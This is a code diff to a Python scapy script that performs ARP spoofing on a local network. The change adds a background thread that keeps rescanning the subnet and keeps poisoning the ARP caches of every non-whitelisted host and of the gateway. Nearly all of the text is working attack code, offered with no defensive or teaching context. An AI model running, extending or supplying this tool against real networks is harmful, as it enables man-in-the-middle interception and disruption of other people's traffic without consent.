@@ -11,6 +11,7 @@ import netifaces
 import pyfiglet
 import time
 import sys
+import threading
 
 console = Console()
 prompt = PromptSession()
@@ -39,9 +40,9 @@ def get_gateway_ip(interface):
         console.print(f"[bold red]❌ Error detecting gateway: {e}[/]")
         return None
 
-def scan_network(interface="wlan0"):
-    console.print(Panel("Scanning network for live hosts...", style="yellow"))
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.110.0/24"), timeout=2, iface=interface, verbose=False)
+def scan_network(interface):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.110.0/24"),
+                 timeout=2, iface=interface, verbose=False)
     devices = []
     for _, rcv in ans:
         try:
@@ -73,39 +74,56 @@ def get_whitelist():
     return whitelist
 
 def find_gateway_mac(gateway_ip, interface):
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), timeout=2, iface=interface, verbose=False)
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip),
+                 timeout=2, iface=interface, verbose=False)
     if not ans:
         console.print(f"[bold red]❌ Could not find gateway MAC for {gateway_ip}.[/]")
         sys.exit(1)
     return ans[0][1].hwsrc
 
-def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface):
-    try:
-        console.print(f"[bold red]⚠️ ARP Spoofing: {target_ip} <-> {gateway_ip}[/]")
-        while True:
-            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), iface=interface, verbose=False)
-            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=interface, verbose=False)
-            time.sleep(2)
-    except KeyboardInterrupt:
-        console.print(f"[yellow]Restoring ARP tables for {target_ip}...[/]")
-        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
-        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac), count=5, iface=interface, verbose=False)
+# Shared state
+spoof_targets = []
+stop_event = threading.Event()
 
-def arp_spoof_all(devices, gateway_ip, gateway_mac, interface, whitelist):
+def update_targets(devices, whitelist):
+    return [dev for dev in devices if dev["ip"] not in whitelist]
+
+def monitor_network(interface, whitelist, refresh_interval=10):
+    global spoof_targets
+    while not stop_event.is_set():
+        updated_devices = scan_network(interface)
+        updated_targets = update_targets(updated_devices, whitelist)
+
+        updated_ips = set(dev["ip"] for dev in updated_targets)
+        current_ips = set(dev["ip"] for dev in spoof_targets)
+
+        if updated_ips != current_ips:
+            spoof_targets = updated_targets
+            console.print("[yellow][~] Network changed. Updated target list.[/]")
+        time.sleep(refresh_interval)
+
+def continuous_spoof(gateway_ip, gateway_mac, interface):
     try:
-        console.print(f"[bold red]⚠️ ARP Spoofing ALL devices (excluding whitelist)[/]")
-        while True:
-            for dev in devices:
-                if dev["ip"] not in whitelist:
-                    sendp(Ether(dst=dev["mac"])/ARP(op=2, pdst=dev["ip"], psrc=gateway_ip, hwdst=dev["mac"]), iface=interface, verbose=False)
-                    sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=dev["ip"], hwdst=gateway_mac), iface=interface, verbose=False)
+        while not stop_event.is_set():
+            for dev in spoof_targets:
+                sendp(Ether(dst=dev["mac"]) / ARP(op=2, pdst=dev["ip"],
+                                                  psrc=gateway_ip, hwdst=dev["mac"]),
+                      iface=interface, verbose=False)
+                sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
+                                                   psrc=dev["ip"], hwdst=gateway_mac),
+                      iface=interface, verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
-        console.print(f"[yellow]Restoring ARP tables for all devices...[/]")
-        for dev in devices:
-            if dev["ip"] not in whitelist:
-                sendp(Ether(dst=dev["mac"])/ARP(op=2, pdst=dev["ip"], psrc=gateway_ip, hwdst=dev["mac"], hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
-                sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=dev["ip"], hwdst=gateway_mac, hwsrc=dev["mac"]), count=5, iface=interface, verbose=False)
+        pass
+    finally:
+        console.print(f"[yellow]\nRestoring ARP tables before exit...[/]")
+        for dev in spoof_targets:
+            sendp(Ether(dst=dev["mac"]) / ARP(op=2, pdst=dev["ip"], psrc=gateway_ip,
+                                              hwdst=dev["mac"], hwsrc=gateway_mac),
+                  count=5, iface=interface, verbose=False)
+            sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=dev["ip"],
+                                               hwdst=gateway_mac, hwsrc=dev["mac"]),
+                  count=5, iface=interface, verbose=False)
 
 def main():
     if len(sys.argv) != 2:
@@ -119,33 +137,30 @@ def main():
     if not gateway_ip:
         gateway_ip = prompt.prompt("[cyan][?] Enter gateway IP manually:[/] ")
 
-    devices = scan_network(interface)
-    if not devices:
-        console.print(f"[bold red]❌ No devices found. Check interface {interface}.[/]")
+    initial_devices = scan_network(interface)
+    if not initial_devices:
+        console.print(f"[bold red]❌ No devices found on {interface}.[/]")
         sys.exit(1)
 
-    display_devices(devices)
+    display_devices(initial_devices)
     whitelist = get_whitelist()
     console.print(f"[bold green]✅ Whitelisted IPs: {whitelist}[/]")
 
-    mode = prompt.prompt("[cyan][?] Select mode - (1) Single target, (2) All devices:[/] ")
-    if mode not in ["1", "2"]:
-        console.print("[bold red]❌ Invalid mode selected.[/]")
-        sys.exit(1)
+    global spoof_targets
+    spoof_targets = update_targets(initial_devices, whitelist)
 
     gateway_mac = find_gateway_mac(gateway_ip, interface)
 
-    if mode == "1":
-        validator = NumberValidator(len(devices))
-        choice = int(prompt.prompt("[?] Select target (number): ", validator=validator)) - 1
-        target_ip = devices[choice]["ip"]
-        if target_ip in whitelist:
-            console.print(f"[bold red]❌ {target_ip} is whitelisted. Cannot spoof.[/]")
-            sys.exit(1)
-        target_mac = devices[choice]["mac"]
-        arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface)
-    else:
-        arp_spoof_all(devices, gateway_ip, gateway_mac, interface, whitelist)
+    # Start background scanner thread
+    scanner_thread = threading.Thread(target=monitor_network, args=(interface, whitelist), daemon=True)
+    scanner_thread.start()
+
+    try:
+        continuous_spoof(gateway_ip, gateway_mac, interface)
+    except KeyboardInterrupt:
+        stop_event.set()
+        scanner_thread.join()
+        console.print("\n[bold yellow]⛔ Exiting...[/]")
 
 if __name__ == "__main__":
     main()
